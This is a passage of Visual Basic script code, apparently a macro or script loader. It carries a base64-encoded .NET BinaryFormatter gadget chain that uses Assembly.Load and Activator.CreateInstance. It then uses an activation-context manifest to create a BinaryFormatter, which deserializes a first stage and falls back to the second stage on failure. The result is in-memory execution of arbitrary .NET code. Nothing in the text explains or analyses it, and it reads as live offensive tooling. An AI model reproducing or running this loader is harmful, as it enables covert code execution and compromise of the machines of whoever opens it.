stage_2 = stage_2 & "YWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlU"
stage_2 = stage_2 & "b2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGlj"
stage_2 = stage_2 & "S2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3Rl"
stage_2 = stage_2 & "bS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2"
stage_2 = stage_2 & "MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
stage_2 = stage_2 & "NWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFAAAAAcAAAAJBQAAAAoJLAAAAAoICAAAAAAKCAgBAAAAARUAAAAPAAAABi0AAADmAlN5"
stage_2 = stage_2 & "c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdl"
stage_2 = stage_2 & "bmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJh"
stage_2 = stage_2 & "bCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5l"
stage_2 = stage_2 & "dXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4w"
stage_2 = stage_2 & "LjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFgAAAAcAAAAJ"
stage_2 = stage_2 & "BgAAAAkwAAAACTEAAAAKCAgAAAAACggIAQAAAAEXAAAADwAAAAYyAAAA7wFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2Vs"
stage_2 = stage_2 & "ZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5l"
stage_2 = stage_2 & "dXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00"
stage_2 = stage_2 & "LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABAYAAAABwAA"
stage_2 = stage_2 & "AAkHAAAACgk1AAAACggIAAAAAAoICAEAAAABGQAAAA8AAAAGNgAAAClTeXN0ZW0uV2ViLlVJLldlYkNvbnRyb2xzLlBhZ2VkRGF0"
stage_2 = stage_2 & "YVNvdXJjZQQAAAAGNwAAAE1TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9r"
stage_2 = stage_2 & "ZW49YjAzZjVmN2YxMWQ1MGEzYRAaAAAABwAAAAkIAAAACAgAAAAACAgKAAAACAEACAEACAEACAgAAAAAARsAAAAPAAAABjkAAAAp"
stage_2 = stage_2 & "U3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5EZXNpZ25lclZlcmIEAAAABjoAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAs"
stage_2 = stage_2 & "IEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAcAAAABQAAAA0CCTsAAAAICAMAAAAJCwAA"
stage_2 = stage_2 & "AAEdAAAADwAAAAY9AAAANFN5c3RlbS5SdW50aW1lLlJlbW90aW5nLkNoYW5uZWxzLkFnZ3JlZ2F0ZURpY3Rpb25hcnkEAAAABj4A"
stage_2 = stage_2 & "AABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRl"
stage_2 = stage_2 & "MDg5EB4AAAABAAAACQkAAAAQHwAAAAIAAAAJCgAAAAkKAAAAECAAAAACAAAABkEAAAAACUEAAAAEJAAAACJTeXN0ZW0uRGVsZWdh"
stage_2 = stage_2 & "dGVTZXJpYWxpemF0aW9uSG9sZGVyAgAAAAhEZWxlZ2F0ZQdtZXRob2QwAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhv"
stage_2 = stage_2 & "bGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCUIAAAAJQwAA"
stage_2 = stage_2 & "AAEoAAAAJAAAAAlEAAAACUUAAAABLAAAACQAAAAJRgAAAAlHAAAAATAAAAAkAAAACUgAAAAJSQAAAAExAAAAJAAAAAlKAAAACUsA"
stage_2 = stage_2 & "AAABNQAAACQAAAAJTAAAAAlNAAAAATsAAAAEAAAACU4AAAAJTwAAAARCAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25I"
stage_2 = stage_2 & "b2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVO"
stage_2 = stage_2 & "YW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxl"
stage_2 = stage_2 & "Z2F0ZUVudHJ5BlAAAADVAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1"
stage_2 = stage_2 & "bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5"
stage_2 = stage_2 & "LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUw"
stage_2 = stage_2 & "ODldXQk+AAAACgk+AAAABlIAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGUwAAAARMb2FkCgRDAAAAL1N5c3RlbS5SZWZs"
stage_2 = stage_2 & "ZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0"
stage_2 = stage_2 & "dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQlTAAAACT4AAAAJ"
stage_2 = stage_2 & "UgAAAAZWAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQZXAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFz"
stage_2 = stage_2 & "c2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgFEAAAAQgAAAAZYAAAAzAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uUmVmbGVj"
stage_2 = stage_2 & "dGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1i"
stage_2 = stage_2 & "NzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1z"
stage_2 = stage_2 & "Y29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1d"
stage_2 = stage_2 & "LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUw"
stage_2 = stage_2 & "ODldXQk+AAAACgk+AAAACVIAAAAGWwAAAAhHZXRUeXBlcwoBRQAAAEMAAAAJWwAAAAk+AAAACVIAAAAGXgAAABhTeXN0ZW0uVHlw"
stage_2 = stage_2 & "ZVtdIEdldFR5cGVzKCkGXwAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkIAAAACgFGAAAAQgAAAAZgAAAAtgNTeXN0ZW0uRnVu"
stage_2 = stage_2 & "Y2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNp"
stage_2 = stage_2 & "b249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBW"
stage_2 = stage_2 & "ZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5D"
stage_2 = stage_2 & "b2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBD"
stage_2 = stage_2 & "dWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAu"
stage_2 = stage_2 & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZiAAAAhAFTeXN0"
stage_2 = stage_2 & "ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAu"
stage_2 = stage_2 & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GYwAAAA1HZXRFbnVtZXJhdG9yCgFH"
stage_2 = stage_2 & "AAAAQwAAAAljAAAACT4AAAAJYgAAAAZmAAAARVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbU3lzdGVt"
stage_2 = stage_2 & "LlR5cGVdIEdldEVudW1lcmF0b3IoKQZnAAAAlAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0"
stage_2 = stage_2 & "ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1"
stage_2 = stage_2 & "NjE5MzRlMDg5XV0gR2V0RW51bWVyYXRvcigpCAAAAAoBSAAAAEIAAAAGaAAAAMACU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxl"
stage_2 = stage_2 & "Y3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1"
stage_2 = stage_2 & "cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBD"
stage_2 = stage_2 & "dWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQm9vbGVhbiwgbXNjb3JsaWIs"
stage_2 = stage_2 & "IFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJ"
stage_2 = stage_2 & "PgAAAAZqAAAAHlN5c3RlbS5Db2xsZWN0aW9ucy5JRW51bWVyYXRvcgZrAAAACE1vdmVOZXh0CgFJAAAAQwAAAAlrAAAACT4AAAAJ"
stage_2 = stage_2 & "agAAAAZuAAAAEkJvb2xlYW4gTW92ZU5leHQoKQZvAAAAGVN5c3RlbS5Cb29sZWFuIE1vdmVOZXh0KCkIAAAACgFKAAAAQgAAAAZw"
stage_2 = stage_2 & "AAAAvQJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwg"
stage_2 = stage_2 & "bXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5"
stage_2 = stage_2 & "XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0"
stage_2 = stage_2 & "ZTA4OV0sW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRv"
stage_2 = stage_2 & "a2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABnIAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJh"
stage_2 = stage_2 & "dG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRv"
stage_2 = stage_2 & "a2VuPWI3N2E1YzU2MTkzNGUwODldXQZzAAAAC2dldF9DdXJyZW50CgFLAAAAQwAAAAlzAAAACT4AAAAJcgAAAAZ2AAAAGVN5c3Rl"
stage_2 = stage_2 & "bS5UeXBlIGdldF9DdXJyZW50KCkGdwAAABlTeXN0ZW0uVHlwZSBnZXRfQ3VycmVudCgpCAAAAAoBTAAAAEIAAAAGeAAAAMYBU3lz"
stage_2 = stage_2 & "dGVtLkZ1bmNgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGlj"
stage_2 = stage_2 & "S2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1"
stage_2 = stage_2 & "cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4AAAAGegAAABBTeXN0ZW0uQWN0aXZh"
stage_2 = stage_2 & "dG9yBnsAAAAOQ3JlYXRlSW5zdGFuY2UKAU0AAABDAAAACXsAAAAJPgAAAAl6AAAABn4AAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJ"
stage_2 = stage_2 & "bnN0YW5jZShTeXN0ZW0uVHlwZSkGfwAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQgAAAAKAU4A"
stage_2 = stage_2 & "AAAPAAAABoAAAAAmU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5Db21tYW5kSUQEAAAACToAAAAQTwAAAAIAAAAJggAAAAgI"
stage_2 = stage_2 & "ACAAAASCAAAAC1N5c3RlbS5HdWlkCwAAAAJfYQJfYgJfYwJfZAJfZQJfZgJfZwJfaAJfaQJfagJfawAAAAAAAAAAAAAACAcHAgIC"
stage_2 = stage_2 & "AgICAgITE9J07irREYv7AKDJDyb3Cws="


    Dim stm_1 As Object, fmt_1 As Object
    
    manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?>"
	manifest = manifest & "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
	manifest = manifest & "<assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />"
	manifest = manifest & "<clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Serialization"
	manifest = manifest & ".Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" "
	manifest = manifest & "runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" "
	manifest = manifest & "progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" /></assembly>"


    Set actCtx = CreateObject("Microsoft.Windows.ActCtx")
    actCtx.ManifestText = manifest
        
    Set stm_1 = actCtx.CreateObject("System.IO.MemoryStream")
    Set fmt_1 = actCtx.CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")

    Dim Decstage_1
    Decstage_1 = b64Decode(stage_1)

    For Each i In Decstage_1
        stm_1.WriteByte i
    Next i

    On Error Resume Next

    stm_1.Position = 0
    Dim o1 As Object
    Set o1 = fmt_1.Deserialize_2(stm_1)

    If Err.Number <> 0 Then
       Dim stm_2 As Object
       
       Set stm_2 = actCtx.CreateObject("System.IO.MemoryStream")

       Dim Decstage_2
       Decstage_2 = b64Decode(stage_2)

       For Each j In Decstage_2
        stm_2.WriteByte j
       Next j

       stm_2.Position = 0
       Dim o2 As Object
       Set o2 = fmt_1.Deserialize_2(stm_2)
    End If

End Function
